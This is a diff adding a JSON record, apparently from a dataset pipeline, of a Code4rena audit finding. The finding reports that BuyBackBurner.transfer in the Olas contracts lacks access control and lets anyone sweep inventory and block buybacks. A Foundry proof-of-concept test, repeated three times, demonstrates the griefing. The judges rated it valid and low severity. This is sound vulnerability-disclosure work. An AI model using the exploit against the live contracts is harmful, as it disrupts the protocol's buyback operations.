@@ -1,0 +1,141 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Olas_j3PRAMM3fVq",
+    "audit_uid": "j3PRAMM3fVq",
+    "requested_submission_uid": "49npVPoQdn4",
+    "requested_finding_uid": "cUThkGxqird",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Olas_j3PRAMM3fVq/20260618_133156/findings.json",
+    "source_submission_uid": "49npVPoQdn4",
+    "source_finding_uid": "cUThkGxqird",
+    "original_report_path": "Olas_j3PRAMM3fVq\\low_valid_49npVPoQdn4.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "49npVPoQdn4",
+  "finding_uid": "cUThkGxqird",
+  "finding_number": "23",
+  "title": "BuyBackBurner.transfer(token) is permissionless and can grief/DoS buybacks by sweeping inventory",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "Merulez99",
+  "body": "## Summary\n`BuyBackBurner.transfer(address token)` can be called by anyone and transfers the entire balance of token held by the buyback contract:\n- if `token == olas` → sends all OLAS to `bridge2Burner`\n- else → sends all of token to `treasury`\nSince `buyBack(secondToken, ...)` requires the contract to hold `secondToken` inventory and reverts on zero balance, an attacker can front-run/race and sweep inventory immediately before a keeper’s buyback, causing the keeper tx to revert with `ZeroValue()`.\n## Root cause\nNo access control on a privileged “sweep” function:\n```solidity\nfunction transfer(address token) external {\n    uint256 tokenAmount = IERC20(token).balanceOf(address(this));\n    if (tokenAmount == 0) revert ZeroValue();\n\n    if (token == olas) {\n        IERC20(olas).transfer(bridge2Burner, tokenAmount);\n    } else {\n        IERC20(token).transfer(treasury, tokenAmount);\n    }\n    emit TokenTransferred(to, tokenAmount);\n}\n```\nAnd `buyBack` reverts when there is no inventory:\n```solidity\nuint256 balance = IERC20(localSecondToken).balanceOf(address(this));\nif (secondTokenAmount == 0 || secondTokenAmount > balance) { secondTokenAmount = balance; }\nif (secondTokenAmount == 0) { revert ZeroValue(); }\n```\n## Impact\n- Reliable griefing of buyback operations (keepers waste gas; buybacks delayed/blocked).\n- Forces routing of non-OLAS inventory to treasury, potentially preventing intended “inventory → buy OLAS → bridge2Burner” cadence.",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport \"../contracts/utils/BuyBackBurner.sol\"; // brings `ZeroValue` error selector into scope\nimport {BuyBackBurnerUniswap} from \"../contracts/utils/BuyBackBurnerUniswap.sol\";\n\nimport {ERC20Token} from \"../contracts/test/ERC20Token.sol\";\n\ncontract PoC_BuyBackBurner is Test {\n    function test_PoC_BuyBackBurner_PermissionlessTransfer_CanGriefBuyBack() public {\n        // Use the repo's standard test token used across the suite (acts as OLAS / secondToken in this PoC).\n        ERC20Token secondToken = new ERC20Token();\n        ERC20Token olas = new ERC20Token();\n\n        address bridge2Burner = address(0xB0B);\n        address treasury = address(0x1337);\n        BuyBackBurnerUniswap burner = new BuyBackBurnerUniswap(address(0x1), bridge2Burner, treasury, address(0x3));\n\n        // Owner initializes burner (oracle/router addresses can be dummies for this PoC).\n        // The core point: `transfer(secondToken)` is permissionless and can drain the entire inventory.\n        address[] memory accounts = new address[](4);\n        accounts[0] = address(olas);\n        accounts[1] = address(secondToken);\n        accounts[2] = address(0xCAFE); // oracle (unused in this grief PoC)\n        accounts[3] = address(0xBEEF); // router (unused in this grief PoC)\n        burner.initialize(abi.encode(accounts, uint256(50)));\n\n        // Protocol inventory arrives (e.g., from fees / operations)\n        secondToken.mint(address(burner), 100 ether);\n        assertEq(secondToken.balanceOf(address(burner)), 100 ether);\n\n        // Sanity: without sweeping, `buyBack(secondToken, 0)` proceeds past the \"zero inventory\" check.\n        // It reverts later because we did not configure a V2 oracle (expected for this focused PoC).\n        vm.expectRevert(bytes(\"Zero oracle address\"));\n        burner.buyBack(address(secondToken), 0);\n\n        // Any third party can front-run / grief by sweeping the inventory to the treasury.\n        vm.prank(address(0xBAD));\n        burner.transfer(address(secondToken));\n\n        assertEq(secondToken.balanceOf(address(burner)), 0);\n        assertEq(secondToken.balanceOf(treasury), 100 ether);\n\n        // Keeper/user buyback now fails earlier because inventory is gone.\n        vm.expectRevert(ZeroValue.selector);\n        burner.buyBack(address(secondToken), 0);\n    }\n\n}\n```",
+  "lines_of_code": [
+    "https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/utils/BuyBackBurner.sol#L478"
+  ],
+  "source_record": {
+    "project_id": "j3PRAMM3fVq",
+    "submission_index": "1294",
+    "api_submission_id": "",
+    "uid": "49npVPoQdn4",
+    "number": "1294",
+    "title": "BuyBackBurner.transfer(token) is permissionless and can grief/DoS buybacks by sweeping inventory",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "Merulez99",
+    "lines_of_code": [
+      "https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/utils/BuyBackBurner.sol#L478"
+    ],
+    "body": "## Summary\n`BuyBackBurner.transfer(address token)` can be called by anyone and transfers the entire balance of token held by the buyback contract:\n- if `token == olas` → sends all OLAS to `bridge2Burner`\n- else → sends all of token to `treasury`\nSince `buyBack(secondToken, ...)` requires the contract to hold `secondToken` inventory and reverts on zero balance, an attacker can front-run/race and sweep inventory immediately before a keeper’s buyback, causing the keeper tx to revert with `ZeroValue()`.\n## Root cause\nNo access control on a privileged “sweep” function:\n```solidity\nfunction transfer(address token) external {\n    uint256 tokenAmount = IERC20(token).balanceOf(address(this));\n    if (tokenAmount == 0) revert ZeroValue();\n\n    if (token == olas) {\n        IERC20(olas).transfer(bridge2Burner, tokenAmount);\n    } else {\n        IERC20(token).transfer(treasury, tokenAmount);\n    }\n    emit TokenTransferred(to, tokenAmount);\n}\n```\nAnd `buyBack` reverts when there is no inventory:\n```solidity\nuint256 balance = IERC20(localSecondToken).balanceOf(address(this));\nif (secondTokenAmount == 0 || secondTokenAmount > balance) { secondTokenAmount = balance; }\nif (secondTokenAmount == 0) { revert ZeroValue(); }\n```\n## Impact\n- Reliable griefing of buyback operations (keepers waste gas; buybacks delayed/blocked).\n- Forces routing of non-OLAS inventory to treasury, potentially preventing intended “inventory → buy OLAS → bridge2Burner” cadence.",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport \"../contracts/utils/BuyBackBurner.sol\"; // brings `ZeroValue` error selector into scope\nimport {BuyBackBurnerUniswap} from \"../contracts/utils/BuyBackBurnerUniswap.sol\";\n\nimport {ERC20Token} from \"../contracts/test/ERC20Token.sol\";\n\ncontract PoC_BuyBackBurner is Test {\n    function test_PoC_BuyBackBurner_PermissionlessTransfer_CanGriefBuyBack() public {\n        // Use the repo's standard test token used across the suite (acts as OLAS / secondToken in this PoC).\n        ERC20Token secondToken = new ERC20Token();\n        ERC20Token olas = new ERC20Token();\n\n        address bridge2Burner = address(0xB0B);\n        address treasury = address(0x1337);\n        BuyBackBurnerUniswap burner = new BuyBackBurnerUniswap(address(0x1), bridge2Burner, treasury, address(0x3));\n\n        // Owner initializes burner (oracle/router addresses can be dummies for this PoC).\n        // The core point: `transfer(secondToken)` is permissionless and can drain the entire inventory.\n        address[] memory accounts = new address[](4);\n        accounts[0] = address(olas);\n        accounts[1] = address(secondToken);\n        accounts[2] = address(0xCAFE); // oracle (unused in this grief PoC)\n        accounts[3] = address(0xBEEF); // router (unused in this grief PoC)\n        burner.initialize(abi.encode(accounts, uint256(50)));\n\n        // Protocol inventory arrives (e.g., from fees / operations)\n        secondToken.mint(address(burner), 100 ether);\n        assertEq(secondToken.balanceOf(address(burner)), 100 ether);\n\n        // Sanity: without sweeping, `buyBack(secondToken, 0)` proceeds past the \"zero inventory\" check.\n        // It reverts later because we did not configure a V2 oracle (expected for this focused PoC).\n        vm.expectRevert(bytes(\"Zero oracle address\"));\n        burner.buyBack(address(secondToken), 0);\n\n        // Any third party can front-run / grief by sweeping the inventory to the treasury.\n        vm.prank(address(0xBAD));\n        burner.transfer(address(secondToken));\n\n        assertEq(secondToken.balanceOf(address(burner)), 0);\n        assertEq(secondToken.balanceOf(treasury), 100 ether);\n\n        // Keeper/user buyback now fails earlier because inventory is gone.\n        vm.expectRevert(ZeroValue.selector);\n        burner.buyBack(address(secondToken), 0);\n    }\n\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/j3PRAMM3fVq/submissions/1294",
+    "raw": {
+      "auditUid": "j3PRAMM3fVq",
+      "createdAt": "2026-02-09T19:35:02.937Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "e4GXFcXdb6q",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-02-22T17:52:20.595Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "cUThkGxqird"
+        },
+        {
+          "uid": "3NBAGZLCJ2f",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-02-22T17:52:23.735Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "cUThkGxqird"
+        },
+        {
+          "uid": "KtP5vDprU8K",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-02-22T18:08:10.996Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "49npVPoQdn4",
+          "findingUid": null
+        },
+        {
+          "uid": "MHRpeZ2B5pd",
+          "userUid": "qRHoF9ASsG7",
+          "userAuditRole": "sponsor",
+          "createdAt": "2026-02-26T20:58:43.693Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "cUThkGxqird"
+        }
+      ],
+      "finding": {
+        "uid": "cUThkGxqird",
+        "number": 23,
+        "duplicates": 12
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2026-03-13T20:28:53.654Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": {
+        "uid": "mycqgvHW4V7",
+        "handle": "Valves",
+        "members": [
+          {
+            "uid": "tioN7VMBBcL",
+            "handle": "Merulez99"
+          },
+          {
+            "uid": "nSXUQEtEHP4",
+            "handle": "vesko210"
+          }
+        ]
+      },
+      "title": "BuyBackBurner.transfer(token) is permissionless and can grief/DoS buybacks by sweeping inventory",
+      "uid": "49npVPoQdn4",
+      "updatedAt": "2026-02-09T19:35:02.937Z",
+      "user": {
+        "uid": "tioN7VMBBcL",
+        "handle": "Merulez99"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Summary\n`BuyBackBurner.transfer(address token)` can be called by anyone and transfers the entire balance of token held by the buyback contract:\n- if `token == olas` → sends all OLAS to `bridge2Burner`\n- else → sends all of token to `treasury`\nSince `buyBack(secondToken, ...)` requires the contract to hold `secondToken` inventory and reverts on zero balance, an attacker can front-run/race and sweep inventory immediately before a keeper’s buyback, causing the keeper tx to revert with `ZeroValue()`.\n## Root cause\nNo access control on a privileged “sweep” function:\n```solidity\nfunction transfer(address token) external {\n    uint256 tokenAmount = IERC20(token).balanceOf(address(this));\n    if (tokenAmount == 0) revert ZeroValue();\n\n    if (token == olas) {\n        IERC20(olas).transfer(bridge2Burner, tokenAmount);\n    } else {\n        IERC20(token).transfer(treasury, tokenAmount);\n    }\n    emit TokenTransferred(to, tokenAmount);\n}\n```\nAnd `buyBack` reverts when there is no inventory:\n```solidity\nuint256 balance = IERC20(localSecondToken).balanceOf(address(this));\nif (secondTokenAmount == 0 || secondTokenAmount > balance) { secondTokenAmount = balance; }\nif (secondTokenAmount == 0) { revert ZeroValue(); }\n```\n## Impact\n- Reliable griefing of buyback operations (keepers waste gas; buybacks delayed/blocked).\n- Forces routing of non-OLAS inventory to treasury, potentially preventing intended “inventory → buy OLAS → bridge2Burner” cadence.",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport \"../contracts/utils/BuyBackBurner.sol\"; // brings `ZeroValue` error selector into scope\nimport {BuyBackBurnerUniswap} from \"../contracts/utils/BuyBackBurnerUniswap.sol\";\n\nimport {ERC20Token} from \"../contracts/test/ERC20Token.sol\";\n\ncontract PoC_BuyBackBurner is Test {\n    function test_PoC_BuyBackBurner_PermissionlessTransfer_CanGriefBuyBack() public {\n        // Use the repo's standard test token used across the suite (acts as OLAS / secondToken in this PoC).\n        ERC20Token secondToken = new ERC20Token();\n        ERC20Token olas = new ERC20Token();\n\n        address bridge2Burner = address(0xB0B);\n        address treasury = address(0x1337);\n        BuyBackBurnerUniswap burner = new BuyBackBurnerUniswap(address(0x1), bridge2Burner, treasury, address(0x3));\n\n        // Owner initializes burner (oracle/router addresses can be dummies for this PoC).\n        // The core point: `transfer(secondToken)` is permissionless and can drain the entire inventory.\n        address[] memory accounts = new address[](4);\n        accounts[0] = address(olas);\n        accounts[1] = address(secondToken);\n        accounts[2] = address(0xCAFE); // oracle (unused in this grief PoC)\n        accounts[3] = address(0xBEEF); // router (unused in this grief PoC)\n        burner.initialize(abi.encode(accounts, uint256(50)));\n\n        // Protocol inventory arrives (e.g., from fees / operations)\n        secondToken.mint(address(burner), 100 ether);\n        assertEq(secondToken.balanceOf(address(burner)), 100 ether);\n\n        // Sanity: without sweeping, `buyBack(secondToken, 0)` proceeds past the \"zero inventory\" check.\n        // It reverts later because we did not configure a V2 oracle (expected for this focused PoC).\n        vm.expectRevert(bytes(\"Zero oracle address\"));\n        burner.buyBack(address(secondToken), 0);\n\n        // Any third party can front-run / grief by sweeping the inventory to the treasury.\n        vm.prank(address(0xBAD));\n        burner.transfer(address(secondToken));\n\n        assertEq(secondToken.balanceOf(address(burner)), 0);\n        assertEq(secondToken.balanceOf(treasury), 100 ether);\n\n        // Keeper/user buyback now fails earlier because inventory is gone.\n        vm.expectRevert(ZeroValue.selector);\n        burner.buyBack(address(secondToken), 0);\n    }\n\n}\n```",
+      "linesOfCode": "https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/utils/BuyBackBurner.sol#L478",
+      "number": 1294,
+      "aiExplanation": null,
+      "_index": 1294
+    }
+  }
+}
